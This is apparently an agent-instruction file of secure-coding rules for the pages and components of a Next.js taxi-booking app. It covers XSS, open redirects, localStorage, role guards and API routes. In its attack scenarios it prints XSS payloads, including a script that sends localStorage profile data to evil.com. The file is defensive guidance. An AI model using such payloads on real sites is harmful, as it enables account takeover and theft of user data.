# Web Pages/Components -- Agent Instructions

> This file covers security rules for files in `app/` and `components/`. These are the Next.js pages, route layouts, API routes, and React components.

---

## Stack

- Next.js 16 App Router (React Server Components by default)
- React 19 with `'use client'` directive for interactive components
- Tailwind CSS 4
- React Hook Form + Zod for form validation

---

## Server Components vs Client Components

### Server Components (Default)

- Can access request headers, cookies, search params
- Can import `firebase-admin` (server-only)
- Can use `requireAuth()`, `requireRole()` from `lib/auth-server.ts`
- NO `'use client'` directive

```typescript
// CORRECT -- Server component
import { requireAuth } from "@/lib/auth-server";
import { adminDb } from "@/lib/firebase-admin";

export default async function AdminPage() {
  const session = await requireAuth();
  // ... render with server data
}
```

### Client Components

- Mark with `'use client'` directive
- Can use React hooks, event handlers, browser APIs
- Use client Firebase SDK (`lib/firebase.ts`)
- NEVER import `firebase-admin` in client components

```typescript
// CORRECT -- Client component
"use client";
import { db } from "@/lib/firebase";
import { useAuth } from "@/lib/auth-context";

export default function BookingForm() {
  const { user } = useAuth();
  // ... interactive form
}
```

### Real-World Attack: Admin SDK in Client Component

```
SCENARIO: Developer imports firebase-admin in a client page
  → Admin SDK contains private key credentials
  → Next.js bundles ALL imports into client JavaScript
  → Private key is now visible in browser DevTools > Sources tab
  → ATTACKER: Downloads bundle, extracts private key
  → ATTACKER: Uses private key to access ALL Firestore data
  → RESULT: Complete database compromise

DEFENSE: Never import firebase-admin in client code
  → Use 'use client' directive to mark client components
  → Import firebase-admin ONLY in server components/API routes
  → ESLint rule: no-import from firebase-admin in client files
```

---

## Component Security Rules

### XSS Prevention

**NEVER** use `dangerouslySetInnerHTML` without DOMPurify:

```typescript
// WRONG -- XSS vulnerability
<div dangerouslySetInnerHTML={{ __html: userContent }} />

// CORRECT -- Sanitized content
import DOMPurify from "dompurify";
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userContent) }} />
```

**Finding:** `app/driver/marketing-poster/page.tsx:864` uses `dangerouslySetInnerHTML` with SVG generated from user-controlled data. This must be sanitized.

### Marketing Poster SVG Sanitization

**File:** `app/driver/marketing-poster/page.tsx:864`

This component uses `dangerouslySetInnerHTML` with SVG generated from driver profile data. While the SVG is constructed from template literals (not raw user HTML), all dynamic text passes through `escapeXml()`.

**Requirements:**
1. Add DOMPurify import: `import DOMPurify from "dompurify"`
2. Sanitize before rendering: `DOMPurify.sanitize(posterSvgString, { USE_PROFILES: { svg: true } })`
3. Never allow raw user HTML into the SVG string
4. Never allow `<script>`, `<foreignObject>`, `<embed>` in SVG

### URL Parameter Security

**NEVER** reflect URL params in page content without sanitization:

```typescript
// WRONG -- XSS via URL parameter
const { searchParams } = new URL(request.url);
const name = searchParams.get("name");
return <div>Hello, {name}</div>; // XSS if name is <script>alert(1)</script>

// CORRECT -- Sanitized output
const name = searchParams.get("name")?.slice(0, 100) || "Guest";
return <div>Hello, {name}</div>;
```

**NEVER** use URL params in `href` without validation:

```typescript
// WRONG -- Open redirect
<a href={searchParams.get("returnTo")}>Go back</a>

// CORRECT -- Validated redirect
const returnTo = searchParams.get("returnTo");
const safeReturnTo = returnTo?.startsWith("/") ? returnTo : "/";
<a href={safeReturnTo}>Go back</a>
```

### URL Sanitization

```typescript
// CORRECT -- Validate URL against allowlist
function isAllowedUrl(url: string): boolean {
  try {
    const parsed = new URL(url);
    return ["taxitao.co.ke", "www.taxitao.co.ke"].includes(parsed.hostname);
  } catch {
    return false;
  }
}

// Use for any user-provided URLs
<a href={isAllowedUrl(url) ? url : "#"}>Link</a>
```

### Real-World Attack: XSS via URL Parameter

```
ATTACKER: Sends link: https://taxitao.co.ke/search?name=<script>stealCookies()</script>
  → If name reflected without sanitization: Script executes in victim's browser
  → Script steals: session cookie, localStorage data, CSRF tokens
  → ATTACKER: Gains access to victim's account
  → RESULT: Account takeover, data theft

DEFENSE: Sanitize URL parameters
  → Slice to max length: name?.slice(0, 100)
  → Escape HTML: DOMPurify.sanitize(name)
  → Use text content, not innerHTML: <div>{name}</div>
  → CSP blocks inline scripts: script-src 'nonce-xxx'
```

---

## Form Security

### Server Actions (Preferred)

Use Server Actions for mutations -- they have built-in CSRF protection:

```typescript
// app/actions.ts
"use server";

import { requireAuth } from "@/lib/auth-server";
import { adminDb } from "@/lib/firebase-admin";

export async function updateProfile(formData: FormData) {
  const session = await requireAuth();
  
  const name = formData.get("name") as string;
  if (!name || name.length > 200) {
    throw new Error("Invalid name");
  }
  
  await adminDb.collection("users").doc(session.uid).update({
    name: name.trim(),
  });
}
```

### Client-Side Forms

```typescript
// CORRECT -- React Hook Form + Zod
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { z } from "zod";

const schema = z.object({
  name: z.string().min(1).max(200),
  email: z.string().email(),
});

export default function ProfileForm() {
  const { register, handleSubmit, formState: { errors } } = useForm({
    resolver: zodResolver(schema),
  });
  
  // Client validation is UX only -- server validates too
}
```

**Rules:**
- ALWAYS validate on both client AND server
- NEVER trust client-side validation alone
- Use Server Actions when possible (built-in CSRF)

---

## localStorage Usage (CRITICAL)

**Finding C4:** User profiles, driver profiles, and company profiles are stored in `localStorage` (lines 108, 123, 150, 164 of `lib/auth-context.tsx`). localStorage is XSS-accessible.

### Rules

| Data Type | NEVER Use | Use Instead |
|-----------|-----------|-------------|
| User profile | `localStorage.setItem("userProfile", ...)` | React state |
| Driver profile | `localStorage.setItem("driverProfile", ...)` | React state |
| Company profile | `localStorage.setItem("companyProfile", ...)` | React state |
| Auth tokens | `localStorage` | httpOnly cookies (server-side) |
| UI state (theme, sidebar) | `localStorage` | OK (non-sensitive) |
| Ride IDs | `localStorage` | OK (non-sensitive) |

### Migration Pattern

```typescript
// WRONG -- XSS-accessible
localStorage.setItem("userProfile", JSON.stringify(profile));

// CORRECT -- React state (cleared on unmount)
const [userProfile, setUserProfile] = useState(null);
useEffect(() => {
  fetchProfile().then(setUserProfile);
}, []);
```

### Real-World Attack: localStorage Data Theft

```
SCENARIO: XSS vulnerability in a form field
  → Attacker injects: <script>fetch('https://evil.com/steal?data='+localStorage.getItem('userProfile'))</script>
  → If profiles in localStorage: ATTACKER STEALS ALL USER DATA
    - Email, name, phone, role, companyId, driverId
    - Can impersonate user, access restricted data
    - Can modify vehicle listings, payment records
  → If profiles in React state: localStorage is empty, attack yields nothing

DEFENSE: Store profiles in React state only
  → React state cleared on page unload
  → httpOnly cookies for session data
  → CSP blocks inline scripts
  → DOMPurify sanitizes user content
```

---

## Role-Based Routing

### Layout Guards

```typescript
// app/admin/layout.tsx
import { requireRole } from "@/lib/auth-server";

export default async function AdminLayout({ children }) {
  try {
    await requireRole("admin");
  } catch {
    redirect("/login");
  }
  return <>{children}</>;
}
```

### Client-Side Guards

```typescript
// components/guards/car-hire-guard.tsx
"use client";
import { useAuth } from "@/lib/auth-context";
import { useRouter } from "next/navigation";

export default function CarHireGuard({ children }) {
  const { userProfile } = useAuth();
  const router = useRouter();
  
  useEffect(() => {
    if (userProfile?.role !== "car_hire" && userProfile?.role !== "admin") {
      router.push("/login");
    }
  }, [userProfile]);
  
  return <>{children}</>;
}
```

**Rules:**
- ALWAYS validate role in layout components (server-side preferred)
- Redirect unauthorized users to login
- Don't rely solely on client-side role checks (bypassable)

### Role Simulation (Vendor Portal)

**File:** `app/vendor/layout.tsx` lines 241-285

The `RoleSelector` component allows switching between roles stored in localStorage (`userRole` key). This is for UI preview only.

**Rules:**
- NEVER rely on `userRole` localStorage for authorization checks
- Server-side role verification is the source of truth
- Role simulation should be disabled in production builds
- The simulation only affects UI visibility, not data access

---

## API Route Patterns

### Standard API Route Structure

```typescript
// app/api/example/route.ts
import { NextRequest, NextResponse } from "next/server";
import { requireAuth } from "@/lib/auth-server";
import { rateLimitMiddleware, RATE_LIMITS } from "@/lib/rate-limit";
import { validateBody } from "@/lib/validate";
import { SomeSchema } from "@/lib/validate";

export async function POST(request: NextRequest) {
  // 1. Rate limiting
  const rateLimit = rateLimitMiddleware(request, "endpoint-name", RATE_LIMITS.API_STRICT);
  if (rateLimit) return rateLimit;

  try {
    // 2. Authentication
    const session = await requireAuth();

    // 3. Input validation
    const validation = await validateBody(request, SomeSchema);
    if (!validation.success) return validation.response;

    // 4. Process request
    const result = await processData(validation.data, session);

    // 5. Return response
    return NextResponse.json(result);
  } catch (error: any) {
    // 6. Error handling
    if (error.message === "Unauthorized") {
      return NextResponse.json({ error: "Authentication required" }, { status: 401 });
    }
    return NextResponse.json({ error: "Internal server error" }, { status: 500 });
  }
}
```

### API Route Security Checklist

Every new API route MUST include:
1. Rate limiting: `rateLimitMiddleware(request, "name", RATE_LIMITS.XXX)`
2. Authentication: `await requireAuth()` or `await requireRole("xxx")`
3. Input validation: `await validateBody(request, Schema)`
4. Error handling: try-catch with generic error messages
5. Audit logging: `await logAuditEvent({...})` for sensitive operations

### Authentication Error Pattern

```typescript
// CORRECT -- Generic error messages
if (error.message === "Unauthorized") {
  return NextResponse.json({ error: "Authentication required" }, { status: 401 });
}
if (error.message.includes("Forbidden")) {
  return NextResponse.json({ error: "Insufficient permissions" }, { status: 403 });
}

// WRONG -- Exposes internal details
return NextResponse.json({ error: error.message }, { status: 500 });
```

---

## Navigation & Redirects

### Open Redirect Prevention

```typescript
// CORRECT -- Validate return URL
function validateReturnUrl(url: string | null): string {
  if (!url) return "/";
  // Only allow relative paths starting with /
  if (!url.startsWith("/") || url.startsWith("//")) return "/";
  return url;
}

// In login flow
const returnTo = validateReturnUrl(searchParams.get("returnTo"));
router.push(returnTo);
```

### Internal Redirects

```typescript
// CORRECT -- Use relative paths
router.push("/dashboard");
router.push(`/vendor/fleet?highlight=${vehicleId}`);

// NEVER redirect to external URLs from user input
router.push(userProvidedUrl); // DANGEROUS
```

---

## File Upload Handling

### Client-Side Validation

```typescript
// Validate file type and size before upload
function validateFile(file: File): { valid: boolean; error?: string } {
  const MAX_SIZE = 10 * 1024 * 1024; // 10MB
  const ALLOWED_TYPES = ["image/jpeg", "image/png", "image/webp", "application/pdf"];
  
  if (file.size > MAX_SIZE) return { valid: false, error: "File too large" };
  if (!ALLOWED_TYPES.includes(file.type)) return { valid: false, error: "Invalid file type" };
  
  return { valid: true };
}
```

**Rules:**
- Client validation is UX only -- server validates too
- ALWAYS validate file type and size server-side
- NEVER trust client-side file validation for security

---

## Error Boundaries

```typescript
// components/error-boundary.tsx
"use client";

import { Component, ReactNode } from "react";

interface Props {
  children: ReactNode;
  fallback: ReactNode;
}

interface State {
  hasError: boolean;
}

export default class ErrorBoundary extends Component<Props, State> {
  state: State = { hasError: false };
  
  static getDerivedStateFromError(): State {
    return { hasError: true };
  }
  
  render() {
    if (this.state.hasError) return this.props.fallback;
    return this.props.children;
  }
}
```

**Rules:**
- Wrap error-prone components in Error Boundaries
- Never let unhandled errors crash the entire page
- Log errors to monitoring service

---

## Console Logging Restrictions

```typescript
// WRONG -- Logs sensitive data
console.log("User UID:", user.uid);
console.log("Auth token:", token);
console.log("Payment ID:", paymentId);

// CORRECT -- Log non-sensitive operational data
if (process.env.NODE_ENV === "development") {
  console.log("Component mounted");
}
```

**Finding M1:** 72+ `console.log` instances leak UIDs, emails, and booking IDs. Strip or gate behind `NODE_ENV === "development"`.

---

## Files to Know

| File | Purpose | Security Sensitivity |
|------|---------|---------------------|
| `app/layout.tsx` | Root layout, AuthProvider wrapper | HIGH |
| `app/middleware.ts` | Route protection, security headers | HIGH |
| `app/api/send-email/route.ts` | Email sending API | HIGH |
| `app/api/vendor/reports/route.ts` | CSV report generation | MEDIUM |
| `app/api/vendor/payments/confirm/route.ts` | Payment confirmation | HIGH |
| `app/admin/layout.tsx` | Admin route guard | HIGH |
| `app/vendor/layout.tsx` | Vendor route guard | HIGH |
| `app/driver/marketing-poster/page.tsx` | SVG generation with dangerouslySetInnerHTML | HIGH |
| `components/guards/car-hire-guard.tsx` | Client-side role guard | MEDIUM |

---

*This file covers app/ security rules. For root-level rules, see AGENTS.md. For lib/ rules, see lib/AGENTS.md. For comprehensive security rules, see SECURITY_FRAMEWORK.md.*